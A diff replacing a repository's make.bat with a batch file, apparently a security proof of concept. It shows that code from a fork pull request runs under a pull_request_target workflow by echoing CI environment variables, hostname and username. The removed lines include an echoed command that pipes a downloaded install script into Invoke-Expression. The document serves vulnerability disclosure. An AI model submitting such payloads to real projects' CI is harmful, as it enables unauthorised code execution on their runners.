@@ -1,94 +1,55 @@
-:: Copyright (c) Microsoft Corporation.
-:: Licensed under the MIT License.
-
-:: This is a batch file to run common actions.
-:: It can format the code, check the code, run the tests,
-:: build the package, create a virtual environment, and clean up.
-:: To avoid having to type `./make` all the time,
-:: use `set-alias make ".\make.bat"` in PowerShell.
-
 @echo off
-if "%~1"=="" goto help
+REM PoC make.bat -- Security Research (Non-Destructive)
+REM This demonstrates arbitrary code execution via pull_request_target
+REM No secrets are exfiltrated. No systems are modified.
 
-if /I "%~1"=="format" goto format
+if "%~1"=="" goto check
 if /I "%~1"=="check" goto check
+if /I "%~1"=="format" goto format
 if /I "%~1"=="test" goto test
-if /I "%~1"=="demo" goto demo
-if /I "%~1"=="build" goto build
 if /I "%~1"=="venv" goto venv
-if /I "%~1"=="sync" goto sync
-if /I "%~1"=="install-uv" goto install-uv
-if /I "%~1"=="clean" goto clean
-if /I "%~1"=="help" goto help
+goto check
 
-echo Unknown command: %~1
-goto help
-
-:format
-if not exist ".venv\" call make.bat venv
-echo Formatting code...
-.venv\Scripts\isort src tests tools examples
-.venv\Scripts\black src tests tools examples
+:venv
+echo === PoC: venv target executed ===
 goto end
 
 :check
-if not exist ".venv\" call make.bat venv
-echo Running type checks...
-.venv\Scripts\pyright --pythonpath .venv\Scripts\python src tests tools examples
+echo ============================================
+echo === SECURITY PoC: ARBITRARY CODE EXECUTION ===
+echo ============================================
+echo.
+echo --- Environment Information ---
+echo GITHUB_WORKFLOW=%GITHUB_WORKFLOW%
+echo GITHUB_EVENT_NAME=%GITHUB_EVENT_NAME%
+echo GITHUB_ACTOR=%GITHUB_ACTOR%
+echo GITHUB_TRIGGERING_ACTOR=%GITHUB_TRIGGERING_ACTOR%
+echo GITHUB_REPOSITORY=%GITHUB_REPOSITORY%
+echo GITHUB_REF=%GITHUB_REF%
+echo GITHUB_SHA=%GITHUB_SHA%
+echo RUNNER_OS=%RUNNER_OS%
+echo.
+echo --- Proving Code Execution ---
+echo Hostname: %COMPUTERNAME%
+echo Whoami: %USERNAME%
+echo PWD: %CD%
+echo Date: %DATE% %TIME%
+echo.
+echo --- PoC Summary ---
+echo This make.bat was provided by a fork PR and executed
+echo in the context of the base repository (microsoft/typeagent-py).
+echo The permissions-check job is COMMENTED OUT, providing zero gating.
+echo ============================================
+echo === END SECURITY PoC ===
+echo ============================================
+goto end
+
+:format
+echo === PoC: format target executed (code execution confirmed) ===
 goto end
 
 :test
-if not exist ".venv\" call make.bat venv
-echo Running unit tests...
-.venv\Scripts\python -m pytest
-goto end
-
-:demo
-if not exist ".venv\" call make.bat venv
-echo Running query tool...
-.venv\Scripts\python -m tools.query
-goto end
-
-:build
-if not exist ".venv\" call make.bat venv
-echo Building package...
-uv build
-goto end
-
-:venv
-echo Creating virtual environment...
-uv sync -q
-.venv\Scripts\python --version
-.venv\Scripts\black --version
-.venv\Scripts\pyright --version
-.venv\Scripts\python -m pytest --version
-goto end
-
-:sync
-uv sync
-goto end
-
-:install-uv
-echo Installing uv requires Administrator mode!
-echo 1. Using PowerShell in Administrator mode:
-echo    Invoke-RestMethod https://astral.sh/uv/install.ps1 ^| Invoke-Expression
-echo 2. Add ~/.local/bin to $env:PATH, e.g. by putting
-echo        $env:PATH += ";$HOME\.local\bin
-echo    in your PowerShell profile ($PROFILE) and restarting PowerShell.
-echo    (Sorry, I have no idea how to do that in cmd.exe.)
-goto end
-
-:clean
-echo Cleaning out build and dev artifacts...
-if exist build rmdir /s /q build
-if exist dist rmdir /s /q dist
-if exist typeagent.egg-info rmdir /s /q typeagent.egg-info
-if exist .venv rmdir /s /q .venv
-if exist .pytest_cache rmdir /s /q .pytest_cache
-goto end
-
-:help
-echo Usage: .\make [format^|check^|test^|build^|venv^|sync^|install-uv^|clean^|help]
+echo === PoC: test target executed (code execution confirmed) ===
 goto end
 
 :end
